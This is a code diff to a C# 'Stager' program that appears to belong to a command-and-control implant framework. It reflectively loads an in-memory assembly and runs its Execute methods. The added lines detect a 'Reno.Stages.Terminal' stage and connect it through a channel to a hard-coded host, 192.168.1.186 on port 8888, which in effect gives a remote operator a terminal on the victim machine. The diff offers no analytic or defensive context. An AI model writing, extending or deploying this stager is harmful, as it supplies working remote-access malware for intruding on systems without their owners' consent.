@@ -10,6 +10,7 @@ using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Security.Cryptography.X509Certificates;
 using System.Net.Security;
+using Reno.Comm;
 
 namespace Stager
 {
@@ -77,18 +78,31 @@ namespace Stager
             Assembly s = Assembly.Load(assembly);
             foreach(var type in s.GetTypes())
             {
-                Console.WriteLine("[*] Loaded Type {0}", type);
-                object instance = Activator.CreateInstance(type);
-                object[] args = new object[] { new string[] { "" } };
-                try
+                if (type.FullName.Equals("Reno.Stages.Terminal"))
                 {
-                    type.GetMethod("Execute").Invoke(instance, null);
-                    return 1;
+                    Assembly a = Assembly.Load(assembly);
+                    ClearChannel channel = new ClearChannel("192.168.1.186", 8888, "GZIP");
+                    object[] p = new object[1];
+                    p[0] = channel;
+                    var terminalInstance = Activator.CreateInstance(type, p);
+                    var executeTerminal = type.GetMethod("Execute");
+                    executeTerminal.Invoke(terminalInstance, null);
                 }
-                catch (Exception e)
+                else
                 {
-                    Console.WriteLine("[-] Error executing command: " + e.Message);
-                    return -1;
+                    Console.WriteLine("[*] Loaded Type {0}", type);
+                    object instance = Activator.CreateInstance(type);
+                    object[] args = new object[] { new string[] { "" } };
+                    try
+                    {
+                        type.GetMethod("Execute").Invoke(instance, null);
+                        return 1;
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine("[-] Error executing command: " + e.Message);
+                        return -1;
+                    }
                 }
             }
             return 1;
